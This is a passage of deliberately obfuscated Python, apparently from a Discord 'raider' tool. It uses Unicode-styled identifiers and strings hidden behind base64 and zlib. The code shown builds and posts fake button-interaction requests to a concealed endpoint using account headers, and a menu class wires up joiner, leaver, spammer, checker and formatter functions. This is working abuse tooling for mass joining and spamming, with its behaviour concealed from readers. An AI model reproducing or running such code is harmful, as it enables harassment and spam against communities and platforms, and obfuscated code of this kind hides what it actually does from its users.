        for 𝘅 in 𝗺𝘦𝙨𝘴𝘢𝗴𝘦𝘴:
            if 𝘅[__𝘪𝗺𝙥𝗼𝙧𝙩__(𝘭𝗠𝙄𝙄𝘔𝗹𝘔𝗡𝘐𝗜𝗡𝗠𝘭𝘭𝘐𝘔𝗹𝘔𝙡𝘐𝘔𝙄𝗠𝘐𝘕𝗠𝘐𝙡𝘭𝙡𝘕𝘭[𝙧𝗼𝘂𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝙧𝙩__(𝘭𝘔𝗜𝘐𝘔𝗹𝘔𝗡𝗜𝘐𝗡𝘔𝙡𝘭𝗜𝗠𝘭𝙈𝗹𝗜𝙈𝘐𝙈𝘐𝗡𝘔𝙄𝗹𝗹𝗹𝙉𝘭[𝙧𝗼𝙪𝘯𝘥(𝙖𝙗𝙨(0.0069195726563432425 + 0.9999760594705523j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()] == 𝙢𝙚𝘀𝘴𝙖𝙜𝗲_𝗶𝗱:
                𝘮𝘦𝘴𝘴𝙖𝘨𝙚𝙗𝙤𝘁𝙩𝙤𝙘𝙡𝗶𝙘𝙠 = 𝘅
        if 𝗺𝗲𝘴𝘴𝗮𝗴𝘦𝗯𝙤𝘵𝙩𝗼𝗰𝗹𝙞𝘤𝙠 == None:
            pass
        𝘣𝙪𝙩𝘁𝙤𝙣𝘴 = []
        𝗹𝗶𝗰𝙯𝗯𝙖 = 𝗿𝘰𝘶𝘯𝘥(𝙖𝙗𝘴(0.0 + 0j))
        for 𝘅 in 𝗺𝗲𝘴𝘀𝘢𝗴𝗲𝘣𝗼𝙩𝘁𝘰𝗰𝗹𝘪𝘤𝘬[__𝗶𝙢𝗽𝘰𝙧𝙩__(𝗹𝙈𝗜𝘐𝘔𝙡𝙈𝘕𝘐𝙄𝗡𝗠𝙡𝙡𝘐𝘔𝘭𝙈𝙡𝗜𝘔𝙄𝗠𝗜𝗡𝙈𝗜𝘭𝗹𝙡𝗡𝙡[𝘳𝙤𝘶𝗻𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝙤𝗿𝙩__(𝘭𝘔𝙄𝘐𝗠𝘭𝙈𝘕𝘐𝘐𝗡𝙈𝗹𝗹𝗜𝙈𝘭𝘔𝗹𝗜𝙈𝘐𝗠𝙄𝙉𝙈𝗜𝙡𝗹𝘭𝘕𝗹[𝗿𝗼𝘶𝗻𝙙(𝘢𝘣𝘴(0.10977463612852367 + 0.9939565027016274j))]).decompress(b'x\xda\x8b4\xb2,Iv\xb7,\x8d\n75H.\xb7\xb5\x05\x00*\x9f\x04\xfb')).decode()]:
            𝘱𝘳𝙞𝘯𝘁(__𝙞𝘮𝘱𝘰𝙧𝘵__(𝙡𝗠𝗜𝗜𝙈𝙡𝙈𝘕𝘐𝘐𝗡𝗠𝙡𝘭𝙄𝘔𝗹𝗠𝙡𝙄𝘔𝗜𝗠𝙄𝘕𝘔𝘐𝘭𝙡𝙡𝗡𝘭[𝘳𝘰𝙪𝘯𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝙧𝘁__(𝙡𝘔𝗜𝗜𝙈𝘭𝗠𝘕𝙄𝙄𝗡𝗠𝘭𝗹𝗜𝘔𝘭𝙈𝘭𝙄𝗠𝗜𝗠𝘐𝘕𝗠𝗜𝗹𝗹𝙡𝘕𝘭[𝗿𝘰𝘶𝗻𝘥(𝙖𝘣𝙨(0.31840945855201497 + 0.9479532777012867j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3\x82\xf3\x0bS\x8d\rl\x01\xfc\xfa\x0cv')).decode().format(𝗿, 𝗱𝗮𝙩𝙚𝙩𝘪𝘮𝗲.datetime.now().strftime(f"{𝘨}{__𝗶𝘮𝘱𝙤𝘳𝘁__(𝙡𝗠𝙄𝗜𝙈𝗹𝗠𝙉𝙄𝙄𝘕𝗠𝙡𝘭𝙄𝗠𝙡𝗠𝗹𝗜𝙈𝗜𝘔𝗜𝙉𝙈𝙄𝙡𝗹𝙡𝘕𝗹[𝘳𝗼𝘂𝗻𝙙(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝘳, 𝗹𝙘, 𝗿, 𝗻𝘯, 𝙜))
            𝗯𝘂𝘵𝙩𝘰𝗻𝙨.append(𝙭[__𝗶𝗺𝙥𝗼𝘳𝙩__(𝗹𝘔𝘐𝗜𝘔𝘭𝘔𝗡𝘐𝘐𝘕𝗠𝗹𝙡𝗜𝘔𝙡𝙈𝗹𝘐𝗠𝗜𝗠𝘐𝗡𝗠𝙄𝗹𝙡𝗹𝗡𝘭[𝗿𝙤𝙪𝙣𝗱(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝘳𝘵__(𝘭𝘔𝙄𝙄𝘔𝙡𝙈𝘕𝙄𝘐𝘕𝙈𝘭𝙡𝘐𝘔𝘭𝗠𝗹𝘐𝙈𝙄𝗠𝙄𝘕𝗠𝙄𝗹𝗹𝘭𝗡𝗹[𝘳𝗼𝙪𝙣𝗱(𝙖𝙗𝘴(0.8162920497920676 + 0.5776394112647307j))]).decompress(b'x\xda\x8b4\xb2,Iv\xb7,\x8d\n75H.\xb7\xb5\x05\x00*\x9f\x04\xfb')).decode()][𝘳𝙤𝘶𝗻𝘥(𝘢𝙗𝘀(0.0 + 0j))])
            𝙡𝘪𝗰𝘇𝗯𝘢 = 𝙡𝙞𝗰𝘻𝘣𝘢 + 𝙧𝙤𝙪𝙣𝗱(𝙖𝗯𝘴(0.3675514959793631 + 0.930003170856601j))
        𝙟𝙨𝘰𝙣_𝗱𝗮𝘵𝘢 = {__𝘪𝙢𝙥𝙤𝙧𝘵__(𝘭𝗠𝙄𝗜𝗠𝘭𝘔𝙉𝗜𝗜𝘕𝙈𝗹𝘭𝗜𝘔𝙡𝙈𝗹𝗜𝗠𝘐𝗠𝙄𝗡𝘔𝗜𝘭𝘭𝗹𝘕𝘭[𝘳𝘰𝘂𝗻𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__(𝘭𝘔𝙄𝗜𝗠𝘭𝗠𝙉𝘐𝘐𝙉𝙈𝗹𝗹𝘐𝘔𝗹𝗠𝙡𝗜𝗠𝘐𝗠𝙄𝗡𝙈𝗜𝙡𝘭𝙡𝗡𝘭[𝗿𝘰𝘶𝘯𝗱(𝘢𝗯𝘴(0.9545701065935572 + 0.2979864285466114j))]).decompress(b'x\xdaK\xf1\xc8)\x8f\n\xb4\xb5\x05\x00\r\r\x02\xb5')).decode(): 𝗿𝘰𝘶𝘯𝗱(𝘢𝗯𝙨(0.8508046966503772 + 2.8768266141979533j)), __𝙞𝙢𝗽𝘰𝘳𝙩__(𝙡𝙈𝘐𝙄𝙈𝙡𝙈𝙉𝘐𝘐𝘕𝘔𝗹𝘭𝗜𝘔𝗹𝙈𝘭𝗜𝗠𝙄𝙈𝘐𝙉𝙈𝙄𝗹𝗹𝙡𝘕𝗹[𝗿𝙤𝙪𝗻𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__(𝘭𝙈𝗜𝘐𝙈𝘭𝙈𝘕𝗜𝗜𝗡𝙈𝘭𝘭𝙄𝗠𝙡𝘔𝘭𝘐𝙈𝗜𝙈𝘐𝙉𝙈𝘐𝘭𝙡𝙡𝙉𝗹[𝗿𝘰𝙪𝙣𝗱(𝗮𝙗𝙨(0.810142645432856 + 0.5862327985118658j))]).decompress(b'x\xdaK\xca\xb5,\x8d4\n\xb5\x05\x00\x0c\x93\x02\x9b')).decode(): __𝗶𝙢𝙥𝘰𝗿𝘵__(𝗹𝙈𝘐𝙄𝗠𝘭𝘔𝙉𝗜𝗜𝗡𝙈𝘭𝘭𝙄𝘔𝙡𝗠𝙡𝗜𝘔𝗜𝙈𝗜𝗡𝘔𝘐𝙡𝗹𝙡𝘕𝘭[𝙧𝘰𝘶𝘯𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__(𝗹𝙈𝙄𝘐𝘔𝙡𝗠𝘕𝗜𝙄𝗡𝙈𝘭𝗹𝘐𝗠𝗹𝘔𝗹𝗜𝘔𝗜𝗠𝗜𝗡𝗠𝘐𝘭𝘭𝘭𝗡𝗹[𝘳𝘰𝘂𝘯𝗱(𝙖𝘣𝘀(0.8001585946715452 + 0.5997884821945633j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), __𝙞𝘮𝘱𝙤𝙧𝘁__(𝙡𝘔𝘐𝘐𝘔𝘭𝙈𝗡𝘐𝙄𝙉𝗠𝘭𝙡𝗜𝙈𝘭𝗠𝙡𝙄𝗠𝘐𝙈𝘐𝙉𝘔𝙄𝗹𝙡𝘭𝙉𝘭[𝘳𝗼𝘂𝘯𝘥(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__(𝘭𝙈𝗜𝗜𝘔𝙡𝙈𝘕𝗜𝗜𝗡𝗠𝙡𝙡𝘐𝗠𝗹𝘔𝘭𝙄𝗠𝗜𝙈𝙄𝗡𝗠𝙄𝗹𝙡𝙡𝙉𝗹[𝙧𝙤𝘶𝗻𝗱(𝗮𝙗𝙨(0.7442205898939316 + 0.6679339140797752j))]).decompress(b'x\xda\x8b2\x0e+Hr\x0fJK\x0c\x0f\xb4\x05\x00\x1a\x14\x03\xfb')).decode(): 𝘨𝙪𝙞𝙡𝗱_𝘪𝘥, __𝘪𝘮𝙥𝘰𝘳𝘁__(𝙡𝙈𝙄𝘐𝘔𝗹𝙈𝙉𝙄𝘐𝗡𝙈𝘭𝘭𝘐𝘔𝘭𝗠𝗹𝗜𝙈𝙄𝘔𝘐𝘕𝘔𝘐𝙡𝙡𝙡𝘕𝘭[𝘳𝗼𝙪𝘯𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝘰𝗿𝘵__(𝘭𝗠𝙄𝗜𝘔𝘭𝘔𝘕𝙄𝘐𝗡𝙈𝙡𝘭𝙄𝗠𝗹𝙈𝘭𝙄𝘔𝗜𝘔𝙄𝘕𝗠𝙄𝙡𝘭𝘭𝘕𝘭[𝙧𝙤𝘶𝘯𝘥(𝘢𝙗𝘀(0.5364998131674121 + 0.8439004387197176j))]).decompress(b'x\xda\x8b4\xca\xc8H\xca5\xcdIr\xb3,\x88r\xb4\xb5\x05\x00.\r\x052')).decode(): 𝗰𝘩𝙖𝗻𝗻𝙚𝘭_𝘪𝗱, __𝗶𝘮𝘱𝗼𝗿𝙩__(𝘭𝗠𝗜𝗜𝗠𝙡𝘔𝙉𝗜𝙄𝗡𝘔𝙡𝘭𝗜𝙈𝙡𝘔𝙡𝙄𝗠𝗜𝗠𝗜𝗡𝗠𝗜𝙡𝘭𝙡𝗡𝘭[𝗿𝘰𝙪𝙣𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝙧𝙩__(𝙡𝙈𝗜𝗜𝗠𝙡𝗠𝘕𝗜𝘐𝙉𝗠𝙡𝙡𝙄𝗠𝙡𝘔𝘭𝙄𝗠𝘐𝗠𝘐𝙉𝗠𝙄𝘭𝘭𝗹𝙉𝗹[𝙧𝗼𝘂𝙣𝙙(𝙖𝙗𝘴(0.8716531625181372 + 0.49012321335775344j))]).decompress(b'x\xdaK\n\x0f\xabJ6r\xcb\x8b\n\xb3\xccMrw\xcbK.\xb7\xb5\x05\x00IK\x06\xda')).decode(): 𝙧𝘰𝙪𝘯𝙙(𝙖𝗯𝘴(0.0 + 0j)), __𝘪𝗺𝙥𝗼𝗿𝘵__(𝗹𝙈𝙄𝗜𝘔𝙡𝗠𝙉𝘐𝘐𝙉𝘔𝙡𝘭𝘐𝗠𝙡𝘔𝗹𝗜𝗠𝘐𝙈𝙄𝙉𝗠𝗜𝗹𝗹𝘭𝙉𝙡[𝘳𝗼𝘂𝘯𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝗼𝙧𝘵__(𝘭𝗠𝗜𝗜𝘔𝙡𝙈𝙉𝘐𝘐𝘕𝘔𝙡𝘭𝘐𝙈𝘭𝙈𝙡𝗜𝗠𝗜𝘔𝗜𝗡𝘔𝗜𝘭𝗹𝙡𝗡𝙡[𝘳𝗼𝙪𝘯𝙙(𝘢𝘣𝘀(0.643761235276976 + 0.7652264187511183j))]).decompress(b'x\xdaK\n\x0f\xabJ6r\xcb\x8b\n\xb3,\x88r\xb4\xb5\x05\x00/%\x05A')).decode(): 𝗺𝙚𝙨𝙨𝗮𝘨𝘦_𝙞𝘥, __𝙞𝘮𝗽𝙤𝙧𝙩__(𝘭𝙈𝗜𝘐𝘔𝙡𝗠𝙉𝙄𝗜𝘕𝗠𝙡𝙡𝗜𝙈𝗹𝗠𝘭𝗜𝙈𝙄𝘔𝙄𝗡𝗠𝙄𝘭𝗹𝘭𝘕𝘭[𝗿𝙤𝙪𝗻𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝘳𝙩__(𝘭𝗠𝗜𝙄𝗠𝗹𝘔𝗡𝙄𝗜𝘕𝙈𝙡𝗹𝗜𝗠𝙡𝘔𝘭𝘐𝙈𝗜𝗠𝗜𝙉𝙈𝗜𝗹𝘭𝗹𝙉𝗹[𝙧𝙤𝘶𝙣𝘥(𝘢𝙗𝘴(0.01344509626408874 + 0.9999096106081036j))]).decompress(b'x\xda\x8b\x8cp*Or\xcf\xc9\x8a\x8c\x08*H22MK\x0c\x0f\xb4\x05\x00I\xd8\x06\xd2')).decode(): 𝙢𝗲𝘴𝘴𝗮𝙜𝘦𝙗𝘰𝘁𝘁𝙤𝗰𝙡𝘪𝗰𝙠[__𝗶𝘮𝙥𝗼𝙧𝘁__(𝘭𝘔𝗜𝘐𝘔𝗹𝗠𝙉𝙄𝗜𝘕𝙈𝘭𝗹𝘐𝗠𝘭𝘔𝗹𝙄𝙈𝙄𝙈𝗜𝙉𝘔𝗜𝗹𝙡𝙡𝗡𝘭[𝙧𝙤𝘶𝘯𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝙤𝘳𝘁__(𝙡𝘔𝙄𝗜𝗠𝙡𝘔𝗡𝘐𝙄𝘕𝗠𝙡𝘭𝗜𝘔𝗹𝘔𝘭𝙄𝘔𝘐𝗠𝗜𝗡𝘔𝗜𝗹𝗹𝘭𝙉𝙡[𝗿𝙤𝘶𝙣𝙙(𝙖𝙗𝙨(0.3253718446399104 + 0.9455861476965608j))]).decompress(b'x\xda\x8b\x8c\x083Ht\xb7\xac\x04\x00\x0bp\x02\x92')).decode()][__𝙞𝙢𝘱𝘰𝙧𝙩__(𝙡𝗠𝘐𝘐𝘔𝘭𝘔𝙉𝗜𝙄𝗡𝗠𝘭𝘭𝗜𝙈𝙡𝗠𝘭𝙄𝘔𝗜𝘔𝘐𝘕𝘔𝙄𝙡𝘭𝗹𝘕𝙡[𝗿𝙤𝙪𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__(𝗹𝘔𝗜𝘐𝙈𝘭𝗠𝙉𝘐𝗜𝙉𝘔𝙡𝘭𝗜𝘔𝙡𝘔𝘭𝘐𝗠𝙄𝙈𝙄𝗡𝙈𝘐𝘭𝘭𝙡𝗡𝗹[𝙧𝗼𝙪𝗻𝘥(𝘢𝗯𝘀(0.33956059779846726 + 0.9405841804021304j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()], __𝗶𝙢𝘱𝙤𝙧𝙩__(𝘭𝙈𝙄𝙄𝘔𝗹𝙈𝗡𝘐𝗜𝗡𝙈𝙡𝙡𝙄𝘔𝙡𝘔𝙡𝘐𝙈𝙄𝗠𝘐𝙉𝘔𝘐𝘭𝙡𝘭𝙉𝗹[𝗿𝙤𝘂𝘯𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝗼𝘳𝙩__(𝘭𝘔𝙄𝗜𝘔𝗹𝗠𝗡𝘐𝗜𝗡𝙈𝙡𝘭𝘐𝗠𝗹𝗠𝗹𝙄𝙈𝙄𝙈𝘐𝙉𝗠𝙄𝗹𝗹𝙡𝘕𝗹[𝙧𝙤𝘂𝙣𝘥(𝘢𝗯𝘴(0.5656057651897944 + 0.8246757656097741j))]).decompress(b'x\xdaK6\n\xabJ6\xca)K\xca\xb1,\x88r\xb4\xb5\x05\x00/\xa8\x05i')).decode(): 𝙪𝘂𝙞𝙙.uuid4().hex, __𝙞𝗺𝙥𝗼𝘳𝙩__(𝗹𝘔𝙄𝗜𝘔𝗹𝙈𝘕𝘐𝗜𝗡𝘔𝙡𝙡𝘐𝗠𝘭𝙈𝘭𝙄𝙈𝘐𝘔𝗜𝘕𝗠𝙄𝙡𝘭𝘭𝙉𝙡[𝙧𝘰𝙪𝗻𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝘳𝙩__(𝘭𝘔𝗜𝘐𝘔𝙡𝘔𝘕𝗜𝗜𝙉𝗠𝗹𝘭𝘐𝗠𝙡𝙈𝙡𝘐𝘔𝙄𝗠𝗜𝗡𝗠𝙄𝗹𝘭𝗹𝘕𝙡[𝙧𝗼𝙪𝙣𝗱(𝙖𝘣𝘴(0.4789457925114494 + 0.877844478159759j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb4\xb5\x05\x00\nk\x02<')).decode(): {__𝘪𝘮𝗽𝗼𝘳𝙩__(𝗹𝘔𝘐𝗜𝗠𝗹𝗠𝘕𝗜𝗜𝘕𝗠𝙡𝘭𝘐𝙈𝘭𝗠𝗹𝘐𝘔𝗜𝘔𝗜𝗡𝙈𝙄𝙡𝘭𝘭𝘕𝗹[𝗿𝘰𝙪𝘯𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝙤𝗿𝘁__(𝙡𝗠𝘐𝗜𝘔𝘭𝘔𝙉𝘐𝗜𝙉𝘔𝗹𝘭𝗜𝗠𝗹𝙈𝘭𝗜𝗠𝙄𝙈𝗜𝗡𝙈𝗜𝗹𝘭𝙡𝙉𝘭[𝗿𝗼𝘂𝘯𝙙(𝙖𝙗𝘴(0.686184468820705 + 0.7274275735420309j))]).decompress(b'x\xda\x8b4\xb2,Iv\xb7,\x8d\n75\x880\x0e2Mv\x0f\xb5\x05\x00?\xf5\x05\xf5')).decode(): 𝗿𝗼𝘂𝙣𝙙(𝗮𝙗𝘴(0.4378013666831264 + 1.95149428985339j)), __𝙞𝘮𝙥𝗼𝙧𝘵__(𝗹𝘔𝙄𝗜𝗠𝘭𝗠𝗡𝙄𝙄𝘕𝙈𝙡𝙡𝗜𝙈𝘭𝙈𝘭𝙄𝘔𝙄𝙈𝘐𝘕𝘔𝘐𝘭𝙡𝗹𝘕𝙡[𝙧𝗼𝘂𝗻𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝗿𝘁__(𝙡𝙈𝗜𝘐𝘔𝗹𝙈𝗡𝙄𝗜𝘕𝙈𝙡𝘭𝙄𝙈𝘭𝙈𝙡𝗜𝘔𝗜𝘔𝗜𝙉𝘔𝘐𝘭𝗹𝗹𝘕𝗹[𝘳𝘰𝘂𝗻𝗱(𝗮𝗯𝘀(0.1395069378312992 + 0.9902210936437044j))]).decompress(b'x\xda\x8b4\x0e\xabJq\xb7,\x890\xca\xc9\x06\x00\x19\xf3\x04\x16')).decode(): 𝘣𝘂𝘁𝘁𝘰𝙣𝙨[𝗵𝘧𝙫𝘈𝗲1𝙡𝗗𝘕𝘍_𝘱𝗖𝘧𝗳𝘑𝗺𝙬𝙍6𝗨2𝗾𝘀𝙔𝗔𝙌𝘆𝙊𝘻𝘗𝘳.mro()[7](𝙤𝘱𝘁𝘪𝙤𝗻𝘣𝘶𝙩𝘵𝘰𝗻)][__𝘪𝗺𝘱𝗼𝗿𝘵__(𝗹𝗠𝗜𝙄𝙈𝘭𝗠𝗡𝗜𝙄𝘕𝙈𝗹𝘭𝗜𝙈𝙡𝘔𝗹𝙄𝙈𝗜𝙈𝘐𝗡𝙈𝗜𝙡𝗹𝗹𝘕𝘭[𝙧𝘰𝙪𝙣𝙙(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__(𝘭𝙈𝘐𝘐𝘔𝙡𝙈𝗡𝙄𝗜𝙉𝗠𝗹𝘭𝗜𝙈𝙡𝙈𝗹𝙄𝗠𝙄𝘔𝘐𝘕𝘔𝗜𝗹𝗹𝘭𝘕𝘭[𝗿𝗼𝘶𝗻𝘥(𝙖𝙗𝘴(0.0889643091098743 + 0.9960348145042937j))]).decompress(b'x\xda\x8b4\x0e\xabJq\xb7,\x890\xca\xc9\x06\x00\x19\xf3\x04\x16')).decode()]}}
        𝗿𝗿 = 𝘳𝗲𝘲𝘶𝘦𝘀𝘁𝙨.post(__𝗶𝘮𝗽𝗼𝙧𝘵__(𝗹𝙈𝘐𝘐𝗠𝘭𝗠𝘕𝘐𝙄𝙉𝙈𝗹𝙡𝘐𝗠𝗹𝙈𝘭𝙄𝙈𝘐𝘔𝘐𝙉𝙈𝘐𝙡𝘭𝙡𝗡𝘭[𝘳𝗼𝙪𝗻𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝗼𝘳𝘵__(𝘭𝙈𝗜𝗜𝘔𝘭𝗠𝙉𝘐𝘐𝙉𝗠𝙡𝙡𝙄𝙈𝗹𝗠𝗹𝗜𝘔𝗜𝘔𝗜𝘕𝘔𝘐𝙡𝗹𝗹𝘕𝗹[𝗿𝗼𝘂𝗻𝗱(𝘢𝘣𝙨(0.44876479893246335 + 0.893649906416996j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.K\x0c75\x88\x8a\xf0\xca\x884\x0e*H22\xad\x02\x00\xce\xde\x11\x9d')).decode(), headers=𝗵𝘦𝘢𝗱𝙚𝗿𝘴, json=𝙟𝘀𝘰𝙣_𝗱𝘢𝙩𝘢)
    except:
        𝘱𝘳𝙞𝘯𝙩(__𝘪𝗺𝙥𝙤𝗿𝘵__(𝗹𝘔𝗜𝙄𝙈𝗹𝙈𝙉𝘐𝙄𝗡𝘔𝘭𝙡𝘐𝙈𝗹𝙈𝙡𝙄𝙈𝘐𝘔𝙄𝙉𝘔𝗜𝗹𝗹𝙡𝙉𝙡[𝘳𝘰𝘶𝘯𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝗿𝙩__(𝙡𝗠𝘐𝗜𝘔𝘭𝗠𝙉𝙄𝘐𝗡𝘔𝙡𝙡𝗜𝗠𝗹𝙈𝗹𝘐𝙈𝙄𝘔𝗜𝗡𝘔𝘐𝗹𝗹𝗹𝗡𝗹[𝘳𝙤𝘶𝘯𝗱(𝘢𝗯𝘀(0.2640025643117071 + 0.9645219779957547j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+Hr\x0f\xcb\x86\x89yg\xe6\xa7\xa7\x1a\x1b\xd8\x02\x00\x01g\x0c\xa7')).decode().format(𝙧, 𝘥𝘢𝘁𝗲𝙩𝙞𝙢𝗲.datetime.now().strftime(f"{𝗴}{__𝘪𝘮𝙥𝗼𝙧𝘵__(𝙡𝘔𝘐𝗜𝗠𝙡𝙈𝗡𝘐𝗜𝙉𝙈𝗹𝙡𝘐𝙈𝗹𝘔𝘭𝗜𝗠𝗜𝗠𝘐𝘕𝗠𝘐𝘭𝗹𝗹𝙉𝘭[𝘳𝘰𝙪𝘯𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝘳, 𝘣, 𝘳, 𝙣𝘯, 𝗿𝗿.text))

class Menu:

    def __init__(self):
        𝘴𝘦𝙩𝘢𝙩𝘁𝘳(𝘴𝙚𝗹𝘧, 'raider', 𝙍𝗮𝙞𝘥𝗲𝗿())
        𝘀𝗲𝘁𝗮𝘁𝘵𝘳(𝘴𝘦𝘭𝘧, 'options', {__𝙞𝗺𝙥𝗼𝙧𝘁__(𝙡𝗠𝘐𝘐𝘔𝙡𝗠𝘕𝗜𝘐𝘕𝙈𝘭𝘭𝙄𝘔𝗹𝗠𝘭𝘐𝙈𝙄𝗠𝗜𝘕𝘔𝗜𝘭𝗹𝘭𝘕𝙡[𝗿𝗼𝘂𝘯𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝙤𝘳𝘵__(𝘭𝙈𝗜𝙄𝙈𝙡𝙈𝙉𝗜𝗜𝘕𝙈𝗹𝙡𝙄𝘔𝘭𝙈𝙡𝗜𝗠𝘐𝘔𝘐𝘕𝙈𝙄𝘭𝙡𝙡𝘕𝙡[𝙧𝙤𝘶𝘯𝙙(𝙖𝙗𝙨(0.015387653592096595 + 0.9998816030495459j))]).decompress(b'x\xda\xf3\r\xb4\xb5\x05\x00\x02\xe2\x01\x19')).decode(): 𝘴𝘦𝗹𝘧.joiner, __𝙞𝗺𝘱𝙤𝗿𝙩__(𝘭𝗠𝘐𝘐𝘔𝙡𝗠𝘕𝙄𝘐𝗡𝙈𝗹𝙡𝙄𝘔𝙡𝘔𝗹𝗜𝗠𝗜𝗠𝗜𝘕𝘔𝘐𝗹𝗹𝙡𝙉𝗹[𝘳𝘰𝘶𝘯𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝘰𝗿𝙩__(𝙡𝗠𝗜𝘐𝗠𝘭𝙈𝗡𝘐𝙄𝗡𝗠𝘭𝘭𝗜𝗠𝗹𝘔𝙡𝙄𝘔𝘐𝗠𝘐𝙉𝘔𝙄𝗹𝘭𝘭𝙉𝗹[𝙧𝗼𝘶𝘯𝗱(𝗮𝗯𝘀(0.4073422327051004 + 0.9132755911852806j))]).decompress(b'x\xda\xf3M\xb7\xb5\x05\x00\x03$\x01/')).decode(): 𝘀𝗲𝙡𝘧.leaver, __𝙞𝘮𝘱𝘰𝙧𝙩__(𝙡𝘔𝘐𝗜𝙈𝘭𝙈𝗡𝘐𝙄𝙉𝙈𝘭𝘭𝙄𝙈𝙡𝘔𝗹𝗜𝙈𝗜𝗠𝙄𝘕𝘔𝙄𝘭𝙡𝘭𝗡𝙡[𝗿𝘰𝘶𝗻𝙙(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝙧𝘵__(𝗹𝙈𝗜𝙄𝘔𝘭𝗠𝘕𝗜𝘐𝙉𝗠𝘭𝘭𝙄𝘔𝗹𝙈𝙡𝙄𝗠𝙄𝗠𝗜𝙉𝗠𝙄𝗹𝙡𝘭𝙉𝘭[𝙧𝙤𝙪𝙣𝗱(𝙖𝘣𝘀(0.48637943029275577 + 0.8737477037383814j))]).decompress(b'x\xda\xf3-\xb7\xb5\x05\x00\x03T\x01?')).decode(): 𝘴𝗲𝙡𝗳.spammer, __𝗶𝙢𝘱𝗼𝙧𝙩__(𝘭𝘔𝗜𝙄𝘔𝘭𝘔𝗡𝙄𝘐𝙉𝗠𝗹𝘭𝗜𝙈𝗹𝙈𝙡𝙄𝘔𝘐𝗠𝗜𝗡𝙈𝗜𝗹𝗹𝙡𝗡𝘭[𝙧𝙤𝘂𝗻𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝗼𝗿𝙩__(𝙡𝗠𝗜𝗜𝗠𝘭𝙈𝘕𝗜𝙄𝗡𝙈𝗹𝙡𝗜𝙈𝗹𝗠𝘭𝘐𝗠𝙄𝘔𝘐𝘕𝗠𝘐𝗹𝙡𝗹𝘕𝙡[𝙧𝗼𝙪𝘯𝘥(𝘢𝗯𝘀(0.8188730051653609 + 0.5739747393496084j))]).decompress(b'x\xda\xf3s\xb4\xb5\x05\x00\x02\xb6\x01\n')).decode(): 𝘴𝙚𝘭𝘧.Checker, __𝙞𝘮𝗽𝗼𝘳𝘵__(𝘭𝙈𝗜𝗜𝙈𝗹𝘔𝗡𝙄𝗜𝙉𝗠𝙡𝘭𝗜𝙈𝗹𝘔𝗹𝙄𝙈𝙄𝙈𝙄𝘕𝘔𝙄𝗹𝘭𝘭𝙉𝘭[𝗿𝗼𝘂𝘯𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__(𝘭𝗠𝘐𝙄𝘔𝗹𝗠𝘕𝗜𝗜𝗡𝗠𝘭𝗹𝗜𝙈𝘭𝘔𝘭𝘐𝙈𝗜𝗠𝗜𝘕𝗠𝗜𝙡𝙡𝗹𝙉𝗹[𝗿𝗼𝙪𝙣𝘥(𝙖𝗯𝙨(0.7862515361728362 + 0.6179065640255453j))]).decompress(b'x\xda\xf3K\xb7\xb5\x05\x00\x03(\x010')).decode(): 𝘴𝘦𝙡𝘧.formater, 